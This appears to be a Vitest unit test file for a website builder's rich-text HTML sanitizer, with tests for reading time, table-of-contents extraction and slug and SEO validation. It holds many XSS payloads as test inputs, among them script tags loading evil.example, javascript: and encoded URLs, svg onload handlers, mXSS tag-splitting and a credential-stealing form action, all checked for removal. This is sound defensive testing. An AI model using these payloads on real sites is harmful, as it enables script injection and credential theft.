import {
  calculateReadingTimeMinutes,
  countWordsFromRichText,
  extractTocFromSanitizedHtml,
  htmlToRestrictedRichTextDoc,
  MAX_RICH_TEXT_HTML_LENGTH,
  PostSnapshotSchema,
  PublicationValidationError,
  renderRichTextDocToSanitizedHtml,
  sanitizeRichTextDoc,
  sanitizeRichTextHtml,
  sanitizeRichTextImageSrc,
  sanitizeRichTextLinkHref,
  validatePageSeoOverrides,
} from "@punyasitus/core/content/index";
import {
  normalizeTitleToSlug,
  SlugValidationError,
  validateManualSlug,
} from "@punyasitus/core/slug/index";
import { describe, expect, it } from "vitest";

describe("TASK-006 unit — Rich Text Sanitization, Reading Time & Blog Validation", () => {
  describe("sanitizeRichTextHtml — hostile XSS neutralization", () => {
    it("strips script, iframe, object, embed, svg, math, style, form, and comment payloads completely", () => {
      const hostile = [
        "<p>Pembukaan aman.</p>",
        "<script>alert('xss-1')</script>",
        "<SCRIPT SRC=\"https://evil.example/x.js\"></SCRIPT>",
        "<iframe src=\"https://evil.example/frame\">fallback</iframe>",
        "<object data=\"https://evil.example/a.swf\">obj</object>",
        "<embed src=\"https://evil.example/a.swf\">",
        "<svg onload=\"alert('svg')\"><script>alert(2)</script><circle r=\"10\"/></svg>",
        "<math><mtext></mtext><script>alert('math')</script></math>",
        "<style>body { background: url('javascript:alert(1)'); }</style>",
        "<form action=\"https://evil.example/steal\"><input name=\"pw\"><button>Send</button></form>",
        "<!-- <script>alert('comment')</script> -->",
        "<![CDATA[<script>alert('cdata')</script>]]>",
        "<!DOCTYPE html>",
        "<p>Penutup aman.</p>",
      ].join("");

      const clean = sanitizeRichTextHtml(hostile);

      expect(clean).toContain("<p>Pembukaan aman.</p>");
      expect(clean).toContain("<p>Penutup aman.</p>");
      expect(clean.toLowerCase()).not.toContain("<script");
      expect(clean.toLowerCase()).not.toContain("alert(");
      expect(clean.toLowerCase()).not.toContain("<iframe");
      expect(clean.toLowerCase()).not.toContain("<object");
      expect(clean.toLowerCase()).not.toContain("<embed");
      expect(clean.toLowerCase()).not.toContain("<svg");
      expect(clean.toLowerCase()).not.toContain("<math");
      expect(clean.toLowerCase()).not.toContain("<style");
      expect(clean.toLowerCase()).not.toContain("<form");
      expect(clean.toLowerCase()).not.toContain("<!--");
      // Strictly idempotent
      expect(sanitizeRichTextHtml(clean)).toBe(clean);

      // Nested mXSS tag-splitting vector never reconstructs an executable <script> tag
      const nestedMxss = sanitizeRichTextHtml("<scr<script>ipt>alert('nested')</scr</script>ipt>");
      expect(nestedMxss.toLowerCase()).not.toContain("<script");
      expect(nestedMxss.toLowerCase()).not.toContain("</script");
      expect(sanitizeRichTextHtml(nestedMxss)).toBe(nestedMxss);
    });

    it("strips on* event handlers, inline style CSS expressions, and disallowed attributes on safe tags", () => {
      const hostile =
        '<p onclick="alert(1)" onmouseover="evil()" style="background:expression(alert(1))" class="x" id="y" data-x="1">Teks <strong onfocus="alert(2)" style="color:red">tebal</strong>.</p>';
      const clean = sanitizeRichTextHtml(hostile);

      expect(clean).toBe("<p>Teks <strong>tebal</strong>.</p>");
      expect(clean.toLowerCase()).not.toContain("onclick");
      expect(clean.toLowerCase()).not.toContain("onmouseover");
      expect(clean.toLowerCase()).not.toContain("onfocus");
      expect(clean.toLowerCase()).not.toContain("style=");
      expect(clean.toLowerCase()).not.toContain("expression");
    });

    it("blocks javascript:, vbscript:, data:, entity-encoded, whitespace-split, and protocol-relative URLs on links", () => {
      const cases = [
        '<a href="javascript:alert(1)">click1</a>',
        '<a href="JAVASCRIPT:alert(2)">click2</a>',
        '<a href="&#106;avascript:alert(3)">click3</a>',
        '<a href="&#x6a;&#x61;vascript:alert(4)">click4</a>',
        '<a href="java\t\nscript:alert(5)">click5</a>',
        '<a href="vbscript:msgbox(1)">click6</a>',
        '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">click7</a>',
        '<a href="//evil.example/phish">click8</a>',
        '<a href="https://user:pass@evil.example/">click9</a>',
        '<a href="http://127.0.0.1/admin">click10</a>',
      ];

      for (const html of cases) {
        const clean = sanitizeRichTextHtml(html);
        expect(clean).not.toContain("href=");
        expect(clean.toLowerCase()).not.toContain("javascript:");
        expect(clean.toLowerCase()).not.toContain("vbscript:");
        expect(clean.toLowerCase()).not.toContain("data:");
      }
    });

    it("preserves safe links with rel='noopener noreferrer' and validates safe image sources", () => {
      const html = [
        '<h2>Judul Bagian</h2>',
        '<p>Kunjungi <a href="https://punyasitus.com/panduan" target="_blank" title="Panduan">Panduan</a>, ',
        '<a href="http://example.com/info">Info</a>, ',
        '<a href="mailto:halo@bisnis.id">Email</a>, atau ',
        '<a href="/tentang-kami">Tentang Kami</a>.</p>',
        '<figure>',
        '<img src="https://cdn.example.com/foto.webp" alt="Foto Produk" width="800" height="600" onerror="alert(1)">',
        '<img src="/media/42" alt="Media Lokal">',
        '<img src="javascript:alert(1)" alt="Bad1">',
        '<img src="data:image/svg+xml,<svg onload=alert(1)>" alt="Bad2">',
        '<img src="http://insecure.example.com/a.jpg" alt="Bad3">',
        '<img src="https://127.0.0.1/internal.png" alt="Bad4">',
        '<figcaption>Keterangan gambar</figcaption>',
        '</figure>',
        '<table><thead><tr><th scope="col" colspan="2">Kolom</th></tr></thead><tbody><tr><td>Nilai A</td><td>Nilai B</td></tr></tbody></table>',
        '<ul><li>Satu</li><li>Dua</li></ul><ol><li>Pertama</li></ol>',
        '<blockquote><em>Kutipan</em> <code>kode()</code> <pre>blok</pre> <u>garis</u> <s>coret</s> <b>tebal</b> <i>miring</i></blockquote>',
        '<hr><br>',
      ].join("");

      const clean = sanitizeRichTextHtml(html);

      expect(clean).toContain("<h2>Judul Bagian</h2>");
      expect(clean).toContain(
        '<a href="https://punyasitus.com/panduan" rel="noopener noreferrer" target="_blank" title="Panduan">Panduan</a>',
      );
      expect(clean).toContain('<a href="http://example.com/info" rel="noopener noreferrer">Info</a>');
      expect(clean).toContain('<a href="mailto:halo@bisnis.id" rel="noopener noreferrer">Email</a>');
      expect(clean).toContain('<a href="/tentang-kami" rel="noopener noreferrer">Tentang Kami</a>');
      expect(clean).toContain(
        '<img src="https://cdn.example.com/foto.webp" alt="Foto Produk" width="800" height="600">',
      );
      expect(clean).toContain('<img src="/media/42" alt="Media Lokal">');
      // Unsafe images dropped completely
      expect(clean).not.toContain("Bad1");
      expect(clean).not.toContain("Bad2");
      expect(clean).not.toContain("Bad3");
      expect(clean).not.toContain("Bad4");
      expect(clean).not.toContain("onerror");
      expect(clean).toContain("<table><thead><tr><th scope=\"col\" colspan=\"2\">Kolom</th></tr></thead>");
      expect(clean).toContain("<blockquote><em>Kutipan</em> <code>kode()</code> <pre>blok</pre>");
      expect(sanitizeRichTextHtml(clean)).toBe(clean);
    });

    it("balances unclosed tags and rejects direct link/image helper bypasses (including /cdn-cgi/image/ remote proxying)", () => {
      expect(sanitizeRichTextHtml("<p><strong>Halo dunia")).toBe("<p><strong>Halo dunia</strong></p>");
      expect(sanitizeRichTextLinkHref("&#106;avascript:alert(1)")).toBeNull();
      expect(sanitizeRichTextLinkHref("https://punyasitus.com/blog")).toBe("https://punyasitus.com/blog");
      expect(sanitizeRichTextImageSrc("data:text/html,hi")).toBeNull();
      expect(sanitizeRichTextImageSrc("/media/15")).toBe("/media/15");
      expect(sanitizeRichTextImageSrc("/cdn-cgi/image/width=800,format=webp/media/15.webp")).toBe(
        "/cdn-cgi/image/width=800,format=webp/media/15.webp",
      );
      expect(sanitizeRichTextImageSrc("/cdn-cgi/image/width=800/t/01JABC/hero.webp")).toBe(
        "/cdn-cgi/image/width=800/t/01JABC/hero.webp",
      );
      // Reject remote proxy & traversal attempts under /cdn-cgi/image/
      expect(sanitizeRichTextImageSrc("/cdn-cgi/image/width=800/https://evil.example/x.png")).toBeNull();
      expect(sanitizeRichTextImageSrc("/cdn-cgi/image/width=800/http://evil.example/x.png")).toBeNull();
      expect(sanitizeRichTextImageSrc("/cdn-cgi/image/width=800//evil.example/x.png")).toBeNull();
      expect(sanitizeRichTextImageSrc("/cdn-cgi/image/width=800/https%3A%2F%2Fevil.example/x.png")).toBeNull();
      expect(sanitizeRichTextImageSrc("/cdn-cgi/image/width=800/external/x.png")).toBeNull();
      expect(sanitizeRichTextImageSrc("/media/../secret")).toBeNull();
    });

    it("enforces MAX_RICH_TEXT_HTML_LENGTH inside the serializer without mid-tag, mid-attribute, or mid-entity dangling markup", () => {
      // 1. Link tag crossing the 250,000-character boundary inside nested <p><strong>
      const linkPad = "a".repeat(MAX_RICH_TEXT_HTML_LENGTH - 30);
      const linkBoundaryInput = `<p><strong>${linkPad}<a href="https://example.com/very/long/path">link</a></strong></p>`;
      const linkOut = sanitizeRichTextHtml(linkBoundaryInput);
      expect(linkOut.length).toBeLessThanOrEqual(MAX_RICH_TEXT_HTML_LENGTH);
      expect(linkOut.endsWith("</strong></p>")).toBe(true);
      expect(linkOut).not.toMatch(/<[^>]*$/);
      expect(sanitizeRichTextHtml(linkOut)).toBe(linkOut);

      // 2. Void <img> tag crossing the 250,000-character boundary
      const imgPad = "b".repeat(MAX_RICH_TEXT_HTML_LENGTH - 20);
      const imgBoundaryInput = `<p>${imgPad}<img src="/media/a.webp" alt="test"></p>`;
      const imgOut = sanitizeRichTextHtml(imgBoundaryInput);
      expect(imgOut.length).toBeLessThanOrEqual(MAX_RICH_TEXT_HTML_LENGTH);
      expect(imgOut.endsWith("</p>")).toBe(true);
      expect(imgOut).not.toContain("<img");
      expect(imgOut).not.toMatch(/<[^>]*$/);
      expect(sanitizeRichTextHtml(imgOut)).toBe(imgOut);

      // 3. Entity expansion (& -> &amp;) crossing the 250,000-character boundary (never cut mid-entity!)
      const entityPad = "c".repeat(MAX_RICH_TEXT_HTML_LENGTH - 10);
      const entityBoundaryInput = `<p>${entityPad}&&&&&</p>`;
      const entityOut = sanitizeRichTextHtml(entityBoundaryInput);
      expect(entityOut.length).toBeLessThanOrEqual(MAX_RICH_TEXT_HTML_LENGTH);
      expect(entityOut.endsWith("</p>")).toBe(true);
      // Must never leave a truncated entity like `&am</p>` or `&</p>`
      expect(entityOut).not.toMatch(/&[a-z#0-9]{0,5}<\/p>$/i);
      expect(sanitizeRichTextHtml(entityOut)).toBe(entityOut);

      // 4. Massive entity-expansion payload (60,000 raw `&` -> 300,000 escaped chars)
      const expandedInput = `<p>${"&".repeat(60_000)}<a href="https://example.com/end">end</a></p>`;
      const expandedOut = sanitizeRichTextHtml(expandedInput);
      expect(expandedOut.length).toBeLessThanOrEqual(MAX_RICH_TEXT_HTML_LENGTH);
      expect(expandedOut.endsWith("</p>")).toBe(true);
      expect(expandedOut).not.toMatch(/<[^>]*$/);
      expect(sanitizeRichTextHtml(expandedOut)).toBe(expandedOut);
    });

    it("sanitizes hostile HTML inside TipTap RestrictedRichTextDoc blocks while preserving plain prose", () => {
      const doc = sanitizeRichTextDoc({
        schemaVersion: 1,
        blocks: [
          { type: "paragraph", text: "Diskon 20% & Gratis Ongkir" },
          {
            type: "paragraph",
            text: '<script>alert(1)</script>Aman <img src="x" onerror="alert(2)"> saja',
          },
        ],
      });

      expect(doc.blocks[0]?.text).toBe("Diskon 20% & Gratis Ongkir");
      expect(doc.blocks[1]?.text).toBe("Aman saja");

      const html = renderRichTextDocToSanitizedHtml(doc);
      expect(html).toContain("<p>Diskon 20% &amp; Gratis Ongkir</p>");
      expect(html).toContain("<p>Aman saja</p>");
      expect(html).not.toContain("alert(");

      const roundTripDoc = htmlToRestrictedRichTextDoc(
        "<h2>Bab Satu</h2><p>Isi paragraf.</p><script>evil()</script>",
      );
      expect(roundTripDoc.schemaVersion).toBe(1);
      expect(roundTripDoc.blocks.length).toBe(2);
      expect(roundTripDoc.blocks[0]).toMatchObject({ type: "heading", level: 2, text: "Bab Satu" });
      expect(roundTripDoc.blocks[1]).toMatchObject({ type: "paragraph", text: "Isi paragraf." });
    });
  });

  describe("calculateReadingTimeMinutes & TOC extraction", () => {
    it("computes deterministic reading time at 200 WPM ignoring tags, entities, and stripped script blocks", () => {
      expect(calculateReadingTimeMinutes("")).toBe(1);
      expect(calculateReadingTimeMinutes("<p>Satu dua tiga</p>")).toBe(1);

      const words200 = Array.from({ length: 200 }, (_, i) => `kata${i + 1}`).join(" ");
      expect(countWordsFromRichText(`<p>${words200}</p>`)).toBe(200);
      expect(calculateReadingTimeMinutes(`<p>${words200}</p>`)).toBe(1);

      const words201 = `${words200} tambahan`;
      expect(countWordsFromRichText(`<p>${words201}</p>`)).toBe(201);
      expect(calculateReadingTimeMinutes(`<p>${words201}</p>`)).toBe(2);

      const words450 = Array.from({ length: 450 }, () => "artikel").join(" ");
      expect(calculateReadingTimeMinutes(`<p>${words450}</p>`)).toBe(3);

      // Script block containing 1000 words MUST NOT inflate reading time
      const scriptNoise = Array.from({ length: 1000 }, () => "evilword").join(" ");
      expect(
        calculateReadingTimeMinutes(`<p>Halo&nbsp;dunia &amp; UMKM</p><script>${scriptNoise}</script>`),
      ).toBe(1);
      expect(countWordsFromRichText(`<p>Halo&nbsp;dunia &amp; UMKM</p><script>${scriptNoise}</script>`)).toBe(
        3,
      );

      // Works directly on RestrictedRichTextDoc too
      expect(
        calculateReadingTimeMinutes({
          schemaVersion: 1,
          blocks: [{ type: "paragraph", text: words450 }],
        }),
      ).toBe(3);
    });

    it("extracts deterministic unique TOC anchors from h2 and h3 headings", () => {
      const toc = extractTocFromSanitizedHtml(
        "<h2>Pendahuluan</h2><p>Isi</p><h3>Langkah Pertama</h3><h3>Langkah Pertama</h3><h4>Diabaikan</h4>",
      );
      expect(toc).toEqual([
        { id: "pendahuluan", text: "Pendahuluan", level: 2 },
        { id: "langkah-pertama", text: "Langkah Pertama", level: 3 },
        { id: "langkah-pertama-2", text: "Langkah Pertama", level: 3 },
      ]);
    });
  });

  describe("Blog slug rules & PostSnapshot/SEO validation", () => {
    it("enforces blog/category/tag reserved slugs, NFKD diacritics, 80-char ceiling, and fallback", () => {
      expect(normalizeTitleToSlug("Kafe Caffè Sêrū — Tips Bisnis!")).toBe(
        "kafe-caffe-seru-tips-bisnis",
      );
      expect(normalizeTitleToSlug("🚀🔥✨", { fallbackPrefix: "post", fallbackId: 42 })).toBe(
        "post-42",
      );
      expect(
        normalizeTitleToSlug("panduan lengkap strategi pemasaran digital untuk usaha mikro kecil dan menengah di indonesia tahun ini").length,
      ).toBeLessThanOrEqual(80);

      expect(() => validateManualSlug("category", { namespace: "blog" })).toThrow(SlugValidationError);
      expect(() => validateManualSlug("tag", { namespace: "blog" })).toThrow(SlugValidationError);
      expect(() => validateManualSlug("feed.xml", { namespace: "blog" })).toThrow(SlugValidationError);
      expect(validateManualSlug("tips-umkm-2026", { namespace: "blog" })).toBe("tips-umkm-2026");
      expect(validateManualSlug("berita-bisnis", { namespace: "blog_category" })).toBe("berita-bisnis");
      expect(validateManualSlug("promo-ramadan", { namespace: "blog_tag" })).toBe("promo-ramadan");
    });

    it("validates PostSnapshotSchema with SEO overrides and rejects unsafe canonicalOverride", () => {
      const seo = validatePageSeoOverrides({
        seoTitle: "Tips UMKM Digital 2026",
        seoDescription: "Panduan praktis meningkatkan omzet UMKM melalui website profesional.",
        canonicalOverride: "https://toko.id/blog/tips-umkm-2026",
        noindex: false,
      });
      expect(seo?.canonicalOverride).toBe("https://toko.id/blog/tips-umkm-2026");

      expect(() =>
        validatePageSeoOverrides({ canonicalOverride: "javascript:alert(1)" }),
      ).toThrow(PublicationValidationError);
      expect(() =>
        validatePageSeoOverrides({ canonicalOverride: "http://insecure.example/x" }),
      ).toThrow(PublicationValidationError);
      expect(() =>
        validatePageSeoOverrides({ seoTitle: "a".repeat(71) }),
      ).toThrow(PublicationValidationError);

      const snapshot = PostSnapshotSchema.parse({
        slug: "tips-umkm-2026",
        title: "Tips UMKM Digital 2026",
        excerpt: "Ringkasan artikel.",
        body: { schemaVersion: 1, blocks: [{ type: "paragraph", text: "Isi artikel." }] },
        sanitizedHtml: "<p>Isi artikel.</p>",
        primaryCategoryId: 1,
        categoryIds: [1],
        tagIds: [2],
        authorUserId: "user_123",
        authorName: "Owner Alpha",
        coverMediaId: 5,
        readingTimeMinutes: 2,
        showToc: true,
        seo,
      });
      expect(snapshot.slug).toBe("tips-umkm-2026");
      expect(snapshot.authorUserId).toBe("user_123");
    });
  });
});
